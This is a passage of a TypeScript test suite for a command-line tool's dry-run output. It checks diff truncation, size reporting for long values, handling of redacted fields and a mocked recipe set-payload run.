		expect(diff.endsWith("…\n",),).toBe(true,);
		expect(diff.trimEnd().split("\n",).length,).toBe(60,);
	});

	it("gives only the sizes of a long single-line value, or of a long value with an absent side", () => {
		const shaped = describeChange(dryRun(
			{ line: "a".repeat(400,), },
			{ line: "b".repeat(400,), blob: { items: "x".repeat(400,), }, },
		),);
		expect(shaped["changes"],).toEqual([
			{ path: "line", beforeBytes: 400, afterBytes: 400, },
			{ path: "blob", afterBytes: 412, },
		],);
	});

	it("keeps a value of up to 300 characters inline", () => {
		const value = "v".repeat(298,);
		expect(JSON.stringify(value,),).toHaveLength(300,);
		expect(describeChange(dryRun({ a: value, }, { a: `${value}w`, },),)["changes"],).toEqual([
			{ path: "a", beforeBytes: 298, afterBytes: 299, },
		],);
		expect(describeChange(dryRun({}, { a: value, },),)["changes"],).toEqual([{
			path: "a",
			after: value,
		},],);
	});

	it("treats a redaction marker on both sides as no difference and on one side as a difference", () => {
		const shaped = describeChange(dryRun(
			{ sender: "a@example.com", password: "[redacted]", token: "[redacted]", },
			{ sender: "b@example.com", password: "[redacted]", },
		),);
		expect(shaped["changes"],).toEqual([
			{ path: "sender", before: "a@example.com", after: "b@example.com", },
			{ path: "token", before: "[redacted]", },
		],);
		expect(JSON.stringify(shaped,),).not.toContain("password",);
	});

	it("keeps a result that already reports its own changes and only drops the two copies", () => {
		const own = [{ path: "active", before: true, after: false, },];
		const shaped = describeChange({
			...dryRun({ active: true, }, { active: false, },),
			changes: own,
		},);
		expect(shaped["changes"],).toBe(own,);
		expect(shaped,).not.toHaveProperty("changeCount",);
		expect(shaped,).not.toHaveProperty("current",);
		expect(shaped,).not.toHaveProperty("next",);
	});

	it("returns the raw result for --fields and --full", () => {
		const result = dryRun({ a: 1, }, { a: 2, },);
		expect(shapeCommandResult("dataset", "update", result, { fields: "current,next", },),).toBe(
			result,
		);
		expect(shapeCommandResult("dataset", "update", result, { full: true, },),).toBe(result,);
	});

	it("leaves results without both current and next objects, and non-dry-run results, untouched", () => {
		const onlyCurrent = { dryRun: true, action: "delete", current: { a: 1, }, };
		expect(describeChange(onlyCurrent,),).toBe(onlyCurrent,);
		const scalarNext = dryRun([1,], "x",);
		expect(describeChange(scalarNext,),).toBe(scalarNext,);
		const nullNext = dryRun({ a: 1, }, null,);
		expect(describeChange(nullNext,),).toBe(nullNext,);
		const notDryRun = { updated: "orders", current: { a: 1, }, next: { a: 2, }, };
		expect(describeChange(notDryRun,),).toBe(notDryRun,);
		const falseDryRun = { ...notDryRun, dryRun: false, };
		expect(describeChange(falseDryRun,),).toBe(falseDryRun,);
	});
});

describe("CLI recipe set-payload --dry-run", () => {
	it("reports one payload diff and the backup path instead of three copies of the recipe", async () => {
		const original = Array.from({ length: 30, }, (_, index,) => `step_${index} = compute(${index})`,)
			.join(
				"\n",
			);
		const updated = original.replace("compute(15)", "compute(150)",);
		const directory = mkdtempSync(join(tmpdir(), "dss-cli-dry-payload-",),);
		const filePath = join(directory, "code.py",);
		const backupDir = join(directory, "backups",);
		writeFileSync(filePath, updated,);
		try {
			await withCliServer((req, res,) => {
				if (req.method === "GET") {
					sendJson(res, {
						recipe: {
							type: "python",
							name: "my_recipe",
							projectKey: "TEST",
							params: { envSelection: { envMode: "INHERIT", }, },
							inputs: { main: { items: [{ ref: "orders", },], }, },
							outputs: { main: { items: [{ ref: "orders_out", },], }, },
						},
						payload: original,
					},);
					return;
				}
				res.statusCode = 500;
				res.end(`unexpected ${req.method}`,);
			}, async (url,) => {
				const args = [
					"recipe",
					"set-payload",
					"my_recipe",
					"--file",
					filePath,
					"--backup-dir",
					backupDir,
					"--dry-run",
				];
				const compact = await dss(args, { env: cliEnv(url,), },);
				const raw = await dss([...args, "--fields", "current,next",], { env: cliEnv(url,), },);
				const result = JSON.parse(compact.stdout,) as Record<string, unknown>;
				expect(result,).toMatchObject({
					dryRun: true,
					action: "set-payload",
					resource: "recipe",
					name: "my_recipe",
					file: filePath,
					changeCount: 1,
				},);
				expect(result["backupPath"] as string,).toStartWith(backupDir,);
				expect(result,).not.toHaveProperty("backup",);
				expect(result,).not.toHaveProperty("current",);
				expect(result,).not.toHaveProperty("next",);
				const [change,] = result["changes"] as Array<Record<string, unknown>>;
				expect(change,).toMatchObject({ path: "payload", },);
				expect(change,).not.toHaveProperty("before",);
				expect(change,).not.toHaveProperty("after",);
				const diff = (change["diff"] as string).split("\n",);
				expect(diff,).toContain("-step_15 = compute(15)",);
				expect(diff,).toContain("+step_15 = compute(150)",);
				const rawResult = JSON.parse(raw.stdout,) as Record<string, Record<string, unknown>>;
				expect(rawResult["current"]["payload"],).toBe(original,);
				expect(rawResult["next"]["payload"],).toBe(updated,);
				// The changes, not the whole result: backupPath is as long as the temp directory.
				expect(JSON.stringify(result["changes"],).length * 3,).toBeLessThan(
					JSON.stringify(rawResult,).length,
				);
			},);
		} finally {
			rmSync(directory, { recursive: true, force: true, },);
		}
	});
});
